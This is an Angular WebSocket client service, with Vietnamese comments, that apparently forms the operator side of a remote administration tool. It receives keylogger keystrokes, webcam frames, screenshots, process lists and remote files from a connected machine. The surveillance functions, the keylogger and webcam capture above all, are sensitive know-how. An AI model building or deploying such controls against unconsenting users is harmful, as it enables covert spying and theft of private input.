import { Injectable, signal } from "@angular/core";

export type WsStatus = "disconnected" | "connecting" | "connected";

export interface ExplorerEntry {
  name: string;
  path: string;
  type: string; // drive | dir | file | image | video | ...
}

export interface GalleryItem {
  name: string;
  size?: number;
  path?: string;
  type?: string;
}

@Injectable({ providedIn: "root" })
export class WebSocketService {

  private socket: WebSocket | null = null;

  // =============================
  // Signals
  // =============================
  status = signal<WsStatus>("disconnected");

  lastMessage = signal<any>(null);

  screenshotUrl = signal<string | null>(null);   // SCREEN / REMOTE frame
  webcamFrameUrl = signal<string | null>(null);  // WEBCAM live

  processList = signal<any[]>([]);
  appList = signal<any[]>([]);
  keylogList = signal<any[]>([]);

  // Explorer + Gallery
  explorerItems = signal<ExplorerEntry[]>([]);
  currentPath = signal<string>("");
  galleryItems = signal<GalleryItem[]>([]);
  mediaUrl = signal<string | null>(null);        // để play media nếu cần
    // === NEW for Gallery / Video viewing ===
  viewingFile = signal<any | null>(null);
  
  // WebSocketService (thêm)
  editorContent = signal<{ path: string; content: string } | null>(null);

  // Flag để biết binary tiếp theo là screenshot
  expectingScreenshot = false;

  // =============================
  // CONNECT
  // =============================
  disconnect() {
  if (this.socket) {
    this.socket.close();          // 🔴 đóng WS
    this.socket = null;
    this.status.update(() => 'disconnected');// cập nhật status (signal/observable)
  }
}
  connect(ip: string, port: number) {
    const url = `ws://${ip}:${port}`;
    console.log("Connecting WS:", url);

    this.socket = new WebSocket(url);
    this.socket.binaryType = "arraybuffer";

    this.status.set("connecting");

    this.socket.onopen = () => {
      console.log("WS connected");
      this.status.set("connected");

      // reset 1 số state nhẹ
      this.processList.set([]);
      this.appList.set([]);
      this.keylogList.set([]);
      this.explorerItems.set([]);
      this.galleryItems.set([]);
    };

    this.socket.onerror = () => {
      console.log("WS error");
      this.status.set("disconnected");
    };
    this.socket.onclose = () => {
      console.log("WS closed");
      this.status.set("disconnected");
    };

    this.socket.onmessage = (event) => {
      // BINARY
      if (event.data instanceof ArrayBuffer) {
        this.handleBinary(event.data);
        return;
      }

      // JSON
      try {
        const msg = JSON.parse(event.data);
        this.lastMessage.set(msg);
        this.routeJSON(msg);
      } catch (err) {
        console.error("JSON parse error:", err);
      }
    };
  }

  // =============================
  // SEND JSON
  // =============================
  sendJson(data: any) {
    if (!this.socket || this.status() !== "connected") {
      console.warn("WS not connected, cannot send:", data);
      return;
    }

    if (data.module === "SCREEN" && data.command === "CAPTURE_BINARY") {
      // báo hiệu frame binary tới tiếp theo là screenshot / remote frame
      this.expectingScreenshot = true;
    }

    this.socket.send(JSON.stringify(data));
  }

  // =============================
  // ROUTE JSON
  // =============================
  private routeJSON(msg: any) {

    // ---------- PROCESS ----------
    if (msg.module === "PROCESS" && msg.command === "LIST") {
      this.processList.set(msg.data?.process_list || []);
      return;
    }

    // ---------- APP ----------
    // if (msg.module === "APP" && msg.command === "LIST") {
    //   // backend trả: { module:'APP', command:'LIST', apps:[...] }
    //   if (Array.isArray(msg.apps)) {
    //     this.appList.set(msg.apps);
    //   } else if (Array.isArray(msg.data?.apps)) {
    //     this.appList.set(msg.data.apps);
    //   } else {
    //     console.warn("APP LIST: format không đúng", msg);
    //   }
    //   return;
    // }
    // ==================== APP ====================
// ---------- APP ----------
if (msg.module === "APP" && msg.command === "LIST") {

  // Nếu backend trả thẳng mảng
  if (Array.isArray(msg.data)) {
    const mapped = msg.data.map((item: any) => ({
      exe: item.exe,
      count: item.count,
      pids: item.processes?.map((p: any) => p.pid) ?? []
    }));

    this.appList.set(mapped);
    return;
  }

  // Nếu backend trả { apps: [...] }
  if (Array.isArray(msg.apps)) {
    const mapped = msg.apps.map((item: any) => ({
      exe: item.exe,
      count: item.count,
      pids: item.processes?.map((p: any) => p.pid) ?? []
    }));

    this.appList.set(mapped);
    return;
  }

  // Nếu backend trả { data: [...] }
  if (Array.isArray(msg.data?.apps)) {
    const mapped = msg.data.apps.map((item: any) => ({
      exe: item.exe,
      count: item.count,
      pids: item.processes?.map((p: any) => p.pid) ?? []
    }));

    this.appList.set(mapped);
    return;
  }

  console.warn("APP LIST: không nhận ra format → raw msg =", msg);
  return;
}


    // ---------- KEYLOGGER ----------
    if (msg.module === "KEYBOARD" || msg.module === "KEYLOGGER") {

      // realtime stream key
      if (msg.command === "PRESS") {
        const entry = {
          id: Date.now(),
          timestamp: new Date().toLocaleTimeString(),
          text: msg.data?.key || ""
        };
        this.keylogList.update(x => [...x, entry]);
      }

      // trả về cả log (nếu bạn dùng GET_LOG)
      if (msg.command === "GET_LOG") {
        this.keylogList.set(msg.data || []);
      }

      return;
    }

    // ---------- FILE / EXPLORER / GALLERY ----------
    if (msg.module === "FILE") {
      
if (msg.command === "READ_TEXT") {
  console.log("EDITOR RECEIVED:", msg);
  this.editorContent.set({
    path: msg.path,
    content: msg.content ?? ""
  });
  return;
}

      // LIST_DIR cho Explorer
      if (msg.command === "LIST_DIR") {
        const list = Array.isArray(msg.data) ? msg.data : [];
        const mapped: ExplorerEntry[] = list.map((it: any) => ({
          name: it.name,
          path: it.path,
          type: it.type || "file"
        }));
        this.explorerItems.set(mapped);
        this.currentPath.set(msg.current_path || "");
        return;
      }

      // LIST cho Gallery (danh sách media)
      if (msg.command === "LIST") {
        const list = Array.isArray(msg.data) ? msg.data : [];
        const mapped: GalleryItem[] = list.map((it: any) => ({
          name: it.name,
          size: it.size,
          path: it.path,
          type: it.type
        }));
        this.galleryItems.set(mapped);
        return;
      }
      // ⭐⭐⭐ LOAD MEDIA (ẢNH / VIDEO)
  if (msg.command === "GET") {
    const base64 = msg.data || "";
    const mime = msg.mime || "application/octet-stream";
    
    this.mediaUrl.set(`data:${mime};base64,${base64}`);
    return;
  }
      if (msg.command === "SAVE_VIDEO") {
        console.log("Video saved:", msg);
        return;
      }

      // READ_TEXT nếu sau này bạn thêm editor
      if (msg.command === "READ_TEXT") {
        // tuỳ bạn implement thêm editor, tạm thời log ra
        console.log("READ_TEXT:", msg);
        return;
      }

      // SAVE_VIDEO: backend báo đã lưu xong
      if (msg.command === "SAVE_VIDEO") {
        console.log("SAVE_VIDEO done:", msg);
        // sau khi save xong có thể refresh gallery
        return;
      }
    }


    // ---------- SYSTEM ----------
    if (msg.module === "SYSTEM") {
      console.log("SYSTEM:", msg);
      return;
    }

    console.warn("Unhandled JSON:", msg);
  }

  // =============================
  // HANDLE BINARY STREAM
  // =============================
  // private handleBinary(buff: ArrayBuffer) {

  //   // Nếu quá nhỏ → bỏ
  //   if (buff.byteLength < 50) return;

  //   const blob = new Blob([buff], { type: "image/jpeg" });
  //   const url = URL.createObjectURL(blob);

  //   // Nếu đang chụp screenshot / remote frame
  //   if (this.expectingScreenshot) {
  //     this.expectingScreenshot = false;
  //     this.screenshotUrl.set(url);
  //     return;
  //   }

  //   // Mặc định = WEBCAM STREAM
  //   this.webcamFrameUrl.set(url);
  // }
  private handleBinary(buff: ArrayBuffer) {

    // Nếu đang mở 1 file từ gallery → trả binary vào mediaUrl
    if (this.viewingFile()) {
      const file = this.viewingFile()!;
      const blob = new Blob([buff]);

      const url = URL.createObjectURL(blob);

      // file video hoặc ảnh đều hiển thị bằng mediaUrl
      this.mediaUrl.set(url);

      // this.viewingFile.set(null);
      return;
    }

    // Nếu là screenshot
    if (this.expectingScreenshot) {
      this.expectingScreenshot = false;
      const url = URL.createObjectURL(new Blob([buff]));
      this.screenshotUrl.set(url);
      return;
    }

    // MAC ĐỊNH = WEBCAM STREAM
    const blob = new Blob([buff], { type: "image/jpeg" });
    const url = URL.createObjectURL(blob);
    this.webcamFrameUrl.set(url);
  }

}
